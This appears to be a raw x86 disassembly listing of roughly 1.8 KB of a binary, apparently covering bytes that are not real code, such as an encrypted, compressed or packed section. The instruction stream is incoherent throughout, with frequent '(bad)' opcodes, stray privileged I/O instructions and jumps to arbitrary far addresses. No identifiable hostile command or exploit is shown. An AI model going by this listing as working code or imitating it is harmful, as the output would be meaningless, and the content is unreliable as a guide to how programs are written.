  41ba02:	fldenv [edi-0x29c0b45a]
  41ba08:	push   eax
  41ba09:	xor    cl,BYTE PTR [ebx-0x4a]
  41ba0c:	cmc    
  41ba0d:	inc    eax
  41ba0e:	push   es
  41ba0f:	or     ecx,DWORD PTR [ebp+0x7d]
  41ba12:	retf   
  41ba13:	int3   
  41ba14:	push   edi
  41ba15:	xor    edi,ecx
  41ba17:	or     eax,0xbda5757d
  41ba1c:	xchg   ebx,eax
  41ba1d:	add    al,0x6
  41ba1f:	jmp    0xe124b463
  41ba24:	xchg   ebp,eax
  41ba25:	xlat   BYTE PTR ds:[ebx]
  41ba26:	inc    eax
  41ba27:	vrsqrt28sd xmm2{k3},xmm3,xmm2,{sae}
  41ba2d:	cmp    ebp,DWORD PTR [ebp+edi*1-0x3b]
  41ba31:	jecxz  0x41ba10
  41ba33:	cmp    eax,0x63c7de0f
  41ba38:	sub    edi,esi
  41ba3a:	inc    edi
  41ba3b:	inc    ecx
  41ba3c:	mov    dl,0xe0
  41ba3e:	sbb    eax,0xdd734696
  41ba43:	sbb    esp,esi
  41ba45:	jecxz  0x41b9f5
  41ba47:	dec    eax
  41ba48:	clc    
  41ba49:	loop   0x41bac8
  41ba4b:	sbb    eax,0x4c201e32
  41ba50:	ja     0x41ba21
  41ba52:	or     ecx,DWORD PTR [eax]
  41ba54:	ret    0x6c07
  41ba57:	jne    0x41ba87
  41ba59:	data16 jb 0x41b9fb
  41ba5c:	and    edx,DWORD PTR [eax]
  41ba5e:	dec    ebp
  41ba5f:	je     0x41ba96
  41ba61:	cs mov ecx,0xc7e7b170
  41ba67:	push   esp
  41ba68:	fld    QWORD PTR [ebx-0xb]
  41ba6b:	jmp    0x41ba6b
  41ba6d:	pop    eax
  41ba6e:	fsub   DWORD PTR [edi+ecx*8+0x7]
  41ba72:	sbb    esi,DWORD PTR [eax]
  41ba74:	lea    ebx,[edi+edx*2+0x7c3ab8f5]
  41ba7b:	xchg   ebx,eax
  41ba7c:	ins    BYTE PTR es:[edi],dx
  41ba7d:	xchg   ecx,eax
  41ba7e:	mov    esp,0x38b1615b
  41ba83:	adc    al,0x94
  41ba85:	je     0x41bac6
  41ba87:	inc    ebp
  41ba88:	cli    
  41ba89:	fldenv [esi-0x6bdaa6d4]
  41ba8f:	ror    BYTE PTR ds:[esi+ebx*8+0x74f11a00],1
  41ba97:	or     eax,0xc8646d3a
  41ba9c:	out    dx,eax
  41ba9d:	adc    DWORD PTR [edx+ebx*1],eax
  41baa0:	(bad)  
  41baa1:	pop    ecx
  41baa2:	jg     0x41bad0
  41baa4:	dec    esp
  41baa5:	scas   eax,DWORD PTR es:[edi]
  41baa6:	xor    ebx,ebx
  41baa8:	fild   WORD PTR [ecx+0x5b]
  41baab:	sahf   
  41baac:	xchg   edi,eax
  41baad:	int    0xf4
  41baaf:	(bad)  
  41bab2:	test   BYTE PTR [eax-0x7b7f298],ah
  41bab8:	dec    eax
  41bab9:	(bad)  
  41baba:	jl     0x41baeb
  41babc:	add    al,0x93
  41babe:	add    ebx,0x1b
  41bac1:	bound  edi,QWORD PTR [eax]
  41bac3:	add    esi,DWORD PTR [edx+0x363acf89]
  41bac9:	push   cs
  41baca:	sub    DWORD PTR [edx],0x1b7f3c7a
  41bad0:	sub    BYTE PTR [edx+0x39c9bd7f],0xbd
  41bad7:	pop    ds
  41bad8:	(bad)  
  41bad9:	and    al,BYTE PTR [esi-0xe]
  41badc:	push   0xdd2d696b
  41bae1:	call   0x1a83:0xa472de3
  41bae8:	mov    ds:0x20a003ac,al
  41baed:	repnz dec eax
  41baef:	and    ecx,ecx
  41baf1:	call   0xa4d8:0xb185ec46
  41baf8:	inc    edx
  41baf9:	jecxz  0x41bab8
  41bafb:	adc    DWORD PTR [edi],ebx
  41bafd:	jl     0x41bacd
  41baff:	jg     0x41baef
  41bb01:	jge    0x41bb5b
  41bb03:	loopne 0x41bb5e
  41bb05:	mov    bl,0x37
  41bb07:	pop    edx
  41bb08:	mov    ch,0xc4
  41bb0a:	xor    al,BYTE PTR [esp+ebp*8]
  41bb0d:	or     eax,0x885af06e
  41bb12:	mov    dh,0x33
  41bb14:	sub    DWORD PTR [edx-0x2c],ebx
  41bb17:	fbld   TBYTE PTR [edi]
  41bb19:	fdivr  DWORD PTR [ebx+0x76]
  41bb1c:	inc    edi
  41bb1d:	outs   dx,BYTE PTR ds:[esi]
  41bb1e:	out    dx,al
  41bb1f:	add    ah,dl
  41bb21:	js     0x41bb53
  41bb23:	and    bl,BYTE PTR [ebx+edx*2]
  41bb26:	inc    esi
  41bb27:	jns    0x41bb29
  41bb29:	xchg   esp,eax
  41bb2a:	jg     0x41bae1
  41bb2c:	cmp    bh,BYTE PTR [ebp+eiz*8-0x24]
  41bb30:	repz dec edx
  41bb32:	push   ebp
  41bb33:	into   
  41bb34:	mov    ds:0xdeba6eb5,al
  41bb39:	mov    ecx,DWORD PTR [edx+ebp*2]
  41bb3c:	mov    eax,DWORD PTR [eax-0x5ac053b3]
  41bb42:	cmp    al,0xa6
  41bb45:	mov    dl,0x35
  41bb47:	dec    edi
  41bb48:	fs cli 
  41bb4a:	cmp    ah,BYTE PTR [ecx-0x691285d9]
  41bb50:	call   0x739f74c7
  41bb55:	and    DWORD PTR [edx+0x67],ebp
  41bb58:	sbb    eax,0xff072676
  41bb5d:	xchg   ecx,eax
  41bb5e:	dec    ebp
  41bb5f:	sbb    cl,bl
  41bb61:	in     al,0x87
  41bb63:	out    0x1d,al
  41bb65:	push   ds
  41bb66:	lahf   
  41bb67:	add    ecx,eax
  41bb69:	in     al,0x3a
  41bb6b:	enter  0x153e,0xc6
  41bb6f:	mov    eax,ds:0x9993930f
  41bb74:	fidivr WORD PTR [edi+0xf3e03c0]
  41bb7a:	mov    dl,0xbf
  41bb7c:	dec    ebp
  41bb7d:	daa    
  41bb7e:	stc    
  41bb7f:	adc    ah,BYTE PTR [ecx+ebx*1]
  41bb82:	and    ecx,DWORD PTR [ebx+0x7c]
  41bb85:	xchg   esp,eax
  41bb86:	out    dx,eax
  41bb87:	xchg   esi,eax
  41bb88:	out    0x7e,eax
  41bb8a:	mov    edx,0xed44a5e9
  41bb8f:	cdq    
  41bb90:	es imul eax,ecx,0xffffff9d
  41bb94:	cmp    eax,0x26829aa3
  41bb99:	push   ds
  41bb9a:	stos   BYTE PTR es:[edi],al
  41bb9b:	jmp    0x4f7b:0x955d6999
  41bba2:	pop    ebx
  41bba3:	mov    bl,0x91
  41bba5:	in     eax,0xc4
  41bba7:	mov    dl,0xf5
  41bba9:	xchg   edx,eax
  41bbaa:	ret    
  41bbab:	jp     0x41bb57
  41bbad:	aam    0xf6
  41bbaf:	gs hlt 
  41bbb1:	jmp    DWORD PTR [edi+0x55]
  41bbb4:	fld    TBYTE PTR [ebp+0x1e]
  41bbb7:	mov    ds:0xf6dc01d6,al
  41bbbc:	mov    eax,DWORD PTR [edi]
  41bbbe:	icebp  
  41bbbf:	loop   0x41bb42
  41bbc1:	inc    edx
  41bbc2:	outs   dx,BYTE PTR ds:[esi]
  41bbc3:	aaa    
  41bbc4:	in     eax,0x9b
  41bbc6:	arpl   WORD PTR [esi-0x4269d9c7],bx
  41bbcc:	jnp    0x41bc09
  41bbce:	cmp    BYTE PTR [ecx-0x25b096ad],dl
  41bbd4:	cmp    bh,BYTE PTR [esi+0x46ceba6f]
  41bbda:	pop    esi
  41bbdb:	(bad)  
  41bbdc:	mov    WORD PTR [edx],?
  41bbde:	sub    BYTE PTR [esi+0x5e297e21],dl
  41bbe4:	data16 mov ch,0xa9
  41bbe7:	mov    ecx,0x5232644e
  41bbec:	inc    eax
  41bbed:	add    bh,ah
  41bbef:	popa   
  41bbf0:	dec    esp
  41bbf2:	dec    ebx
  41bbf3:	jbe    0x41bc4c
  41bbf5:	loop   0x41bb77
  41bbf7:	enter  0x2c27,0xef
  41bbfb:	fstp   DWORD PTR [ebx+0x6b6c2758]
  41bc01:	(bad)  
  41bc02:	or     eax,0x36e74e7d
  41bc07:	push   ecx
  41bc08:	sub    BYTE PTR [edx+0x71],cl
  41bc0b:	push   cs
  41bc0c:	fs hlt 
  41bc0e:	mov    dl,0x88
  41bc10:	push   ds
  41bc11:	jbe    0x41bbe5
  41bc13:	add    DWORD PTR [ebp+edi*1+0x59],0x1c
  41bc18:	imul   esi,DWORD PTR [ebx-0x7d],0x5140cf0f
  41bc1f:	sub    eax,0x9e5a9cab
  41bc24:	cmp    al,0xa
  41bc26:	mov    al,0x2a
  41bc28:	mov    dl,bl
  41bc2a:	test   eax,0xc171f22f
  41bc2f:	add    ecx,DWORD PTR [ebx]
  41bc31:	inc    edx
  41bc32:	xchg   edx,eax
  41bc33:	xor    esp,esi
  41bc35:	into   
  41bc36:	xchg   esp,eax
  41bc37:	lock fst QWORD PTR [ecx+0x20]
  41bc3b:	jle    0x41bc46
  41bc3d:	mov    al,0x2e
  41bc3f:	sub    BYTE PTR [ecx],ah
  41bc41:	mov    ds:0xda682866,al
  41bc46:	mov    ds:0x30ff7bd5,al
  41bc4b:	push   ds
  41bc4c:	sbb    DWORD PTR [edx-0x6c2a4c32],0x3f
  41bc53:	fdivr  QWORD PTR [edx+0x29]
  41bc56:	jbe    0x41bc3d
  41bc58:	loop   0x41bcd4
  41bc5a:	inc    ecx
  41bc5b:	push   ecx
  41bc5c:	int    0xe8
  41bc5e:	sbb    esi,DWORD PTR ss:[edx-0x2ca4c7e2]
  41bc65:	test   al,0x82
  41bc67:	(bad)  
  41bc6a:	cwde   
  41bc6b:	push   edx
  41bc6c:	mov    al,0x8a
  41bc6e:	jne    0x41bc02
  41bc70:	xchg   BYTE PTR [edi-0x1d],al
  41bc73:	push   0xffffffac
  41bc75:	outs   dx,BYTE PTR ds:[esi]
  41bc76:	push   0x6a
  41bc78:	retf   0x4aa7
  41bc7b:	in     eax,dx
  41bc7c:	push   0x1495c20c
  41bc81:	mov    ebx,0xf5f5e1a9
  41bc86:	enter  0xcae0,0xe1
  41bc8a:	leave  
  41bc8b:	jp     0x41bc93
  41bc8d:	bound  esp,QWORD PTR [ecx+0x76]
  41bc90:	cmc    
  41bc91:	mov    ch,bl
  41bc93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc94:	dec    eax
  41bc95:	push   ds
  41bc96:	dec    esp
  41bc97:	jmp    0x41bc51
  41bc99:	push   ds
  41bc9a:	cmp    ecx,eax
  41bc9c:	aam    0x61
  41bc9e:	push   ss
  41bc9f:	mov    ds,WORD PTR [edx-0x7b]
  41bca2:	in     eax,0x88
  41bca4:	sbb    DWORD PTR [eax-0x39],ecx
  41bca7:	(bad)  
  41bca8:	push   esp
  41bca9:	pop    esi
  41bcaa:	imul   esi,DWORD PTR [eax],0xffffffdc
  41bcad:	imul   esi,DWORD PTR [ebx],0x64
  41bcb0:	push   edx
  41bcb1:	mov    edx,0x34055e37
  41bcb6:	jno    0x41bc5e
  41bcb8:	shl    DWORD PTR [eax-0x39],0x4b
  41bcbc:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41bcbe:	shl    edi,cl
  41bcc0:	popf   
  41bcc1:	jo     0x41bc86
  41bcc3:	aas    
  41bcc4:	shl    BYTE PTR [edi-0x31cbbab8],0x7d
  41bccb:	pop    ebx
  41bccc:	add    BYTE PTR es:[edi-0x16],bh
  41bcd0:	or     al,0xb2
  41bcd2:	mov    edi,ecx
  41bcd4:	fistp  QWORD PTR [ebx+0x12]
  41bcd7:	clc    
  41bcd8:	dec    eax
  41bcd9:	test   eax,0xb2757ac0
  41bcde:	push   eax
  41bcdf:	mov    esi,DWORD PTR [edi]
  41bce1:	(bad)  
  41bce2:	rcl    ah,0x5b
  41bce5:	ins    DWORD PTR es:[edi],dx
  41bce6:	inc    esp
  41bce7:	xor    al,0x3f
  41bce9:	bound  ebp,QWORD PTR [ecx]
  41bceb:	xor    BYTE PTR [eax],bh
  41bced:	scas   eax,DWORD PTR es:[edi]
  41bcee:	sbb    eax,0xbc437a2
  41bcf3:	nop
  41bcf4:	not    BYTE PTR [ebp+0x27]
  41bcf7:	add    dh,BYTE PTR [esp+ebx*2]
  41bcfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcfb:	fwait
  41bcfc:	int3   
  41bcfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcfe:	sbb    esp,esi
  41bd00:	mov    bl,0x4
  41bd02:	cmp    BYTE PTR [eax],0xf8
  41bd05:	inc    ecx
  41bd06:	in     al,0xe1
  41bd08:	(bad)  
  41bd09:	cdq    
  41bd0a:	ror    cl,cl
  41bd0c:	std    
  41bd0d:	fsub   QWORD PTR [edx-0x333b6eca]
  41bd13:	push   eax
  41bd14:	cmp    al,0x9d
  41bd16:	ins    BYTE PTR es:[edi],dx
  41bd17:	xor    al,0x15
  41bd19:	mov    edi,0xf804d202
  41bd1e:	pop    DWORD PTR [edi]
  41bd20:	dec    eax
  41bd21:	and    bh,cl
  41bd23:	jae    0x41bd25
  41bd25:	jge    0x41bcfa
  41bd27:	fidiv  WORD PTR [ecx+0x22e9e6ad]
  41bd2d:	clc    
  41bd2e:	in     al,dx
  41bd2f:	or     al,0x19
  41bd31:	dec    ecx
  41bd32:	shl    BYTE PTR [ecx],0xb
  41bd35:	mov    al,ds:0x6ebce919
  41bd3a:	into   
  41bd3b:	and    BYTE PTR [ebx+eiz*8-0x22],ah
  41bd3f:	lods   eax,DWORD PTR ds:[esi]
  41bd40:	mov    eax,0x20ec7b5f
  41bd45:	lahf   
  41bd46:	jb     0x41bdba
  41bd48:	push   es
  41bd49:	sub    eax,0x606abf9a
  41bd4e:	aad    0x4f
  41bd50:	(bad)  
  41bd51:	fst    QWORD PTR [edx+0x38]
  41bd54:	jno    0x41bd13
  41bd56:	outs   dx,DWORD PTR ds:[esi]
  41bd57:	cmp    bl,al
  41bd59:	cld    
  41bd5a:	xor    BYTE PTR [esi],cl
  41bd5c:	in     eax,dx
  41bd5d:	mov    ?,eax
  41bd5f:	ds dec ecx
  41bd61:	mov    ebp,0x556259da
  41bd66:	test   al,0x2b
  41bd68:	sub    esi,DWORD PTR [ebx+edx*8-0x6a]
  41bd6c:	sub    cl,BYTE PTR [ecx]
  41bd6e:	aad    0x8c
  41bd70:	inc    ebx
  41bd71:	xor    esp,edi
  41bd73:	push   esi
  41bd74:	pop    edx
  41bd75:	scas   eax,DWORD PTR es:[edi]
  41bd76:	xchg   esp,eax
  41bd77:	inc    edi
  41bd78:	jmp    0x6d48:0x5194e99c
  41bd7f:	jnp    0x41bd89
  41bd81:	xchg   edx,eax
  41bd82:	jne    0x41bda6
  41bd84:	leave  
  41bd85:	pop    ds
  41bd86:	pop    esp
  41bd87:	(bad)  
  41bd89:	ja     0x41bd1b
  41bd8b:	js     0x41bd86
  41bd8d:	(bad)  
  41bd8e:	mov    al,ds:0x194f7f0c
  41bd93:	dec    ebp
  41bd94:	push   edx
  41bd95:	dec    esi
  41bd96:	lods   al,BYTE PTR ds:[esi]
  41bd97:	out    dx,eax
  41bd98:	jmp    0x2043a6e
  41bd9d:	popa   
  41bd9e:	stos   BYTE PTR es:[edi],al
  41bd9f:	stc    
  41bda0:	adc    edi,DWORD PTR [ebx]
  41bda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bda3:	push   es
  41bda4:	adc    eax,0xe08937bb
  41bda9:	xlat   BYTE PTR ds:[ebx]
  41bdaa:	jbe    0x41bded
  41bdac:	test   al,0xeb
  41bdae:	mov    dl,0xc
  41bdb0:	imul   ebp,DWORD PTR [ecx-0x3d],0x75
  41bdb4:	push   esp
  41bdb5:	popf   
  41bdb6:	aad    0xa6
  41bdb8:	sub    BYTE PTR [ecx],0xad
  41bdbb:	aas    
  41bdbc:	push   ss
  41bdbd:	add    ah,bh
  41bdbf:	(bad)  
  41bdc1:	adc    cl,BYTE PTR [esi]
  41bdc3:	test   BYTE PTR [ebp+0x8030c98],cl
  41bdc9:	push   ebp
  41bdca:	fwait
  41bdcb:	dec    esp
  41bdcc:	lods   eax,DWORD PTR ds:[esi]
  41bdcd:	ins    DWORD PTR es:[edi],dx
  41bdce:	inc    ebp
  41bdcf:	dec    edx
  41bdd0:	jo     0x41be22
  41bdd2:	jmp    0x659d6ed2
  41bdd7:	xchg   edx,eax
  41bdd8:	and    BYTE PTR [ecx+0x2c392609],ch
  41bdde:	pushf  
  41bddf:	or     dl,BYTE PTR [ecx]
  41bde1:	jb     0x41be2a
  41bde3:	fcmovbe st,st(1)
  41bde5:	dec    ebx
  41bde6:	scas   eax,DWORD PTR es:[edi]
  41bde7:	mov    ebp,0xf67404e0
  41bdec:	sub    ebp,DWORD PTR [esi+0x34]
  41bdef:	pop    esp
  41bdf0:	pop    ebx
  41bdf1:	add    BYTE PTR [ebp-0x28e60d7a],0x9
  41bdf8:	pop    ecx
  41bdf9:	adc    al,0x30
  41bdfb:	mov    eax,0x6e6d685b
  41be00:	sti    
  41be01:	frstpm(287 only) 
  41be03:	mov    ebx,DWORD PTR [eax+edi*2-0x1d81f0c1]
  41be0a:	dec    eax
  41be0b:	in     al,dx
  41be0c:	jae    0x41bdce
  41be0e:	mov    al,ds:0x5a273dbb
  41be13:	and    eax,0xb263842f
  41be18:	stos   BYTE PTR es:[edi],al
  41be19:	lods   eax,DWORD PTR ds:[esi]
  41be1a:	outs   dx,DWORD PTR ds:[esi]
  41be1b:	enter  0x62e5,0x90
  41be1f:	dec    esi
  41be20:	push   ebp
  41be21:	push   ss
  41be22:	(bad)  
  41be23:	pop    ebx
  41be24:	jmp    0xd6ed:0x11713e4
  41be2b:	or     BYTE PTR [esi-0x17],dl
  41be2e:	inc    edi
  41be2f:	mov    eax,0x88b4bb2a
  41be34:	xor    BYTE PTR [eax-0x80],bl
  41be37:	push   ds
  41be38:	mov    WORD PTR [ecx-0x1a7b1eaf],es
  41be3e:	ret    
  41be3f:	and    eax,0x36f7aa1f
  41be44:	fwait
  41be45:	and    bl,BYTE PTR [ecx+0x39]
  41be48:	stos   DWORD PTR es:[edi],eax
  41be49:	push   0x49f7f651
  41be4e:	loop   0x41beb8
  41be50:	shr    BYTE PTR [ecx-0x4493b32],cl
  41be56:	es pop es
  41be58:	mov    DWORD PTR [esi],esp
  41be5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be5b:	mov    WORD PTR [edi-0x49],cs
  41be5e:	ret    
  41be5f:	outs   dx,DWORD PTR ds:[esi]
  41be60:	cwde   
  41be61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be62:	push   eax
  41be63:	scas   al,BYTE PTR es:[edi]
  41be64:	sahf   
  41be65:	jl     0x41bdfc
  41be67:	mov    edx,0x835d311d
  41be6c:	in     eax,0xd9
  41be6e:	xor    ch,ch
  41be70:	cmp    dl,ch
  41be72:	fwait
  41be73:	mov    esi,0xf3336771
  41be78:	fiadd  DWORD PTR ds:0xc9cf3ff9
  41be7e:	in     al,0x24
  41be80:	es test al,0x5d
  41be83:	mov    edi,0xee922363
  41be88:	mov    DWORD PTR [ebp-0x2c],edi
  41be8b:	pusha  
  41be8c:	popf   
  41be8d:	popf   
  41be8e:	pop    eax
  41be8f:	scas   al,BYTE PTR es:[edi]
  41be90:	mov    al,ch
  41be92:	mov    dl,0xc3
  41be94:	stos   BYTE PTR es:[edi],al
  41be95:	es hlt 
  41be97:	fucom  st(7)
  41be99:	inc    eax
  41be9a:	outs   dx,DWORD PTR ds:[esi]
  41be9b:	das    
  41be9c:	(bad)  
  41be9d:	xchg   edi,eax
  41be9e:	xor    bl,bh
  41bea0:	gs enter 0xae84,0xdb
  41bea5:	jno    0x41bec8
  41bea7:	stos   BYTE PTR es:[edi],al
  41bea8:	push   cs
  41bea9:	sbb    eax,0x82fc3033
  41beae:	or     esp,DWORD PTR [ecx]
  41beb0:	addr16 cwde 
  41beb2:	inc    eax
  41beb3:	jns    0x41beea
  41beb5:	pop    es
  41beb6:	xchg   ecx,eax
  41beb7:	aaa    
  41beb8:	cmp    cl,0x39
  41bebb:	xor    BYTE PTR [ebp+0x46],al
  41bebe:	ins    DWORD PTR es:[edi],dx
  41bebf:	lods   al,BYTE PTR ds:[esi]
  41bec0:	mov    eax,0x526a496d
  41bec5:	cdq    
  41bec6:	fwait
  41bec7:	ins    DWORD PTR es:[edi],dx
  41bec8:	test   al,0x58
  41beca:	shl    DWORD PTR [ebx],cl
  41becc:	sbb    BYTE PTR [edi+0x130a56ba],0x57
  41bed3:	fwait
  41bed4:	lods   eax,DWORD PTR ds:[esi]
  41bed5:	jle    0x41beba
  41bed7:	cdq    
  41bed8:	cwde   
  41bed9:	stos   DWORD PTR es:[edi],eax
  41beda:	sbb    BYTE PTR [ebp-0x10],0xe1
  41bede:	jg     0x41be84
  41bee0:	inc    ecx
  41bee1:	adc    BYTE PTR [edx-0x7e],dl
  41bee4:	xchg   esi,eax
  41bee5:	add    eax,0x242ad4f7
  41beeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41beec:	arpl   WORD PTR [esi-0x5e],di
  41beef:	lds    edx,FWORD PTR [eax-0x4cc3a8ac]
  41bef5:	adc    al,0x13
  41bef7:	pop    edx
  41bef8:	hlt    
  41bef9:	jno    0x41bf1e
  41befb:	into   
  41befc:	mov    ds:0xaf828cc2,eax
  41bf01:	cmp    eax,eax
  41bf03:	lahf   
  41bf04:	test   al,0xcd
  41bf06:	ss mov al,cl
  41bf09:	fstp   QWORD PTR [edx-0x1d9d14a2]
  41bf0f:	(bad)  
  41bf10:	lea    ecx,[esi]
  41bf12:	shr    BYTE PTR [ebp-0x44],1
  41bf15:	repnz imul ebp,DWORD PTR [edx+0x59e4dc0d],0x5a67aee
  41bf20:	and    DWORD PTR [ecx-0x52957145],edi
  41bf26:	cmp    DWORD PTR [ebp-0x7db3ae96],0xffffffff
  41bf2d:	inc    DWORD PTR [edi+0x7f]
  41bf30:	cmp    al,0xbf
  41bf32:	pop    edx
  41bf33:	jp     0x41bebc
  41bf35:	mov    edi,0xe7082e4b
  41bf3a:	and    al,0xde
  41bf3c:	imul   esi,DWORD PTR fs:[ebx-0x16],0xf9a9205d
  41bf44:	clc    
  41bf45:	test   DWORD PTR [esi-0x4c],0x7c3c7b7e
  41bf4c:	stc    
  41bf4d:	xchg   BYTE PTR [edx-0x454af339],cl
  41bf53:	push   ebx
  41bf54:	test   eax,0x38467d30
  41bf59:	xchg   edx,eax
  41bf5a:	call   0xa61709cb
  41bf5f:	in     eax,dx
  41bf60:	fild   WORD PTR [ebp-0x74]
  41bf63:	sbb    DWORD PTR [ebp+edi*2+0x11],edx
  41bf67:	ret    
  41bf68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf69:	pop    edi
  41bf6a:	cmp    al,0xef
  41bf6c:	gs addr16 popa 
  41bf6f:	cmp    BYTE PTR [ebx],dh
  41bf71:	je     0x41bf5c
  41bf73:	repz pop ecx
  41bf75:	sbb    bl,BYTE PTR [edi+0x3e]
  41bf78:	add    eax,0xa92f44d1
  41bf7d:	lea    esp,[ebp+0x7b]
  41bf80:	add    dl,al
  41bf82:	lock leave 
  41bf84:	inc    esi
  41bf85:	cs js  0x41bff8
  41bf88:	call   0xf2d172ad
  41bf8d:	aam    0xb3
  41bf8f:	rcl    bh,cl
  41bf91:	call   0x280d5769
  41bf96:	test   al,0x3c
  41bf98:	xor    DWORD PTR [ecx],edx
  41bf9a:	stos   DWORD PTR es:[edi],eax
  41bf9b:	adc    DWORD PTR [ecx],esp
  41bf9d:	mov    cs,WORD PTR [ecx+0x536d453d]
  41bfa3:	add    eax,0xfb73c2ed
  41bfa8:	inc    edi
  41bfa9:	stc    
  41bfaa:	je     0x41bf4b
  41bfac:	retf   0xe6f5
  41bfaf:	nop    DWORD PTR [edx]
  41bfb2:	push   0x7e
  41bfb4:	cmp    DWORD PTR [ebp-0x4d],ebp
  41bfb7:	out    dx,eax
  41bfb8:	xor    edx,DWORD PTR [esp+edx*8-0x6fd74b89]
  41bfbf:	inc    edi
  41bfc0:	pcmpgtw mm0,mm6
  41bfc3:	mov    ebp,0x8737562b
  41bfc8:	stos   BYTE PTR es:[edi],al
  41bfc9:	or     DWORD PTR [ebx+ecx*2+0x10],eax
  41bfcd:	js     0x41bfed
  41bfcf:	or     al,0x32
  41bfd1:	push   esi
  41bfd2:	jns    0x41bfcf
  41bfd4:	jecxz  0x41c028
  41bfd6:	sbb    ebp,DWORD PTR [edx-0x3e]
  41bfd9:	lds    ecx,FWORD PTR [ebp-0x4b]
  41bfdc:	xor    DWORD PTR [edi+eiz*1-0x3f],edx
  41bfe0:	cwde   
  41bfe1:	and    eax,0x55bda7d5
  41bfe6:	dec    ebx
  41bfe7:	test   bh,ch
  41bfe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfea:	sbb    DWORD PTR [eax-0x33],ebp
  41bfed:	out    0x34,al
  41bfef:	outs   dx,BYTE PTR ds:[esi]
  41bff0:	mov    al,0xa8
  41bff2:	in     al,dx
  41bff3:	xlat   BYTE PTR ds:[ebx]
  41bff4:	iret   
  41bff5:	xchg   DWORD PTR [esi+eax*8-0x48c539a9],ebx
  41bffc:	and    ah,BYTE PTR [ebx-0x25]
  41bfff:	mov    ?,eax
  41c001:	(bad)  
  41c002:	sub    esi,DWORD PTR [ebx+0x78]
  41c005:	fwait
  41c006:	cwde   
  41c007:	mov    dh,0xbf
  41c009:	cmp    ch,BYTE PTR [edx-0x8]
  41c00c:	jno    0x41bfe3
  41c00e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c00f:	icebp  
  41c010:	and    DWORD PTR [esi+0x31],ecx
  41c013:	push   edi
  41c014:	out    0x1c,eax
  41c016:	or     bh,BYTE PTR [esi-0x5c30917d]
  41c01c:	or     BYTE PTR [eax-0x759d7c31],al
  41c022:	lahf   
  41c023:	cmp    al,0x96
  41c025:	nop
  41c026:	mov    ch,cl
  41c028:	add    eax,0x8c758920
  41c02d:	retf   
  41c02e:	(bad)  [ecx-0x25]
  41c031:	shl    DWORD PTR [esi+0x2e],1
  41c034:	dec    esp
  41c035:	mov    esp,0x81a5c69a
  41c03a:	ret    
  41c03b:	and    ebx,ebx
  41c03d:	jmp    0xef9462f0
  41c042:	adc    BYTE PTR [ebp+edx*4+0xd4dabba],0xbd
  41c04a:	push   ss
  41c04b:	adc    DWORD PTR [ebx],esi
  41c04d:	jp     0x41c002
  41c04f:	scas   al,BYTE PTR es:[edi]
  41c050:	push   edx
  41c051:	sbb    esi,edx
  41c053:	sub    al,0x4e
  41c055:	cmp    DWORD PTR [eax+edx*4-0x6],ecx
  41c059:	scas   eax,DWORD PTR es:[edi]
  41c05a:	shr    BYTE PTR [ecx+0x66],cl
  41c05d:	repnz imul edx,DWORD PTR [edx-0x325c6958],0xffffffb6
  41c065:	jo     0x41c085
  41c067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c068:	dec    ecx
  41c069:	fsubr  DWORD PTR [ecx+0x20]
  41c06c:	pop    ebp
  41c06d:	or     eax,0x8a9998ad
  41c072:	sub    ch,bl
  41c074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c075:	and    ebp,0x450afae4
  41c07b:	les    esi,FWORD PTR [ebp-0x26c7133a]
  41c081:	jnp    0x41c0f5
  41c083:	shl    BYTE PTR [ebx-0x80],cl
  41c086:	not    BYTE PTR [edi-0x3c7eede8]
  41c08c:	push   0xd2286a50
  41c091:	shr    cl,cl
  41c093:	daa    
  41c094:	pop    eax
  41c095:	sub    dl,BYTE PTR [eax]
  41c097:	fisubr WORD PTR ss:[eax+0x2981129b]
  41c09e:	mov    edx,0xcb4d9181
  41c0a3:	popa   
  41c0a4:	mov    cl,0x77
  41c0a6:	jle    0x41c05c
  41c0a8:	sub    eax,0x6f31051f
  41c0ad:	scas   eax,DWORD PTR es:[edi]
  41c0ae:	add    eax,0x8df85e5a
  41c0b3:	into   
  41c0b4:	call   0xec2d:0x4a0bc5b9
  41c0bb:	lock ja 0x41c11c
  41c0be:	and    esp,edi
  41c0c0:	bound  ebp,QWORD PTR [eax+0xa51a5b4]
  41c0c6:	out    0x12,al
  41c0c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0c9:	jg     0x41c11d
  41c0cb:	adc    BYTE PTR [ebp+0x29e5e499],ch
  41c0d1:	mov    al,ds:0xcbf3a89c
  41c0d6:	repnz inc edx
  41c0d8:	dec    ebx
  41c0d9:	test   al,0x83
  41c0db:	imul   ebx,DWORD PTR [esi+edx*4],0x50
  41c0df:	mov    ds:0xeaf263d6,al
  41c0e4:	lock rcl BYTE PTR [esp+ebp*2-0x4a],cl
  41c0e9:	push   edx
  41c0ea:	inc    esi
  41c0eb:	sti    
  41c0ec:	mov    dh,BYTE PTR [edi-0x200da88c]
  41c0f2:	test   DWORD PTR [ebp+0x3aedc116],0x4b64ebcb
  41c0fc:	in     eax,0x91
  41c0fe:	and    bh,BYTE PTR [edx]
  41c100:	hlt    
  41c101:	lods   eax,DWORD PTR ds:[esi]
  41c102:	rcl    DWORD PTR [edi+0x51410687],cl
  41c108:	cs sahf 
  41c10a:	ret    
  41c10b:	xor    ecx,esp
  41c10d:	xchg   BYTE PTR [edx],ah
  41c10f:	mov    ah,BYTE PTR [eax-0x65b06c5a]
  41c115:	pop    ebx
  41c116:	sub    BYTE PTR [esi+0x39079434],al
  41c11c:	sub    eax,0x9d6c516a
  41c121:	mov    edi,0xf931264e
  41c126:	mov    eax,0xd5b9e1f0
  41c12b:	cdq    
  41c12c:	iret   
  41c12d:	sub    esi,edx
  41c12f:	mov    dh,0xa4
  41c131:	add    bl,BYTE PTR [edx-0x1adadcdc]
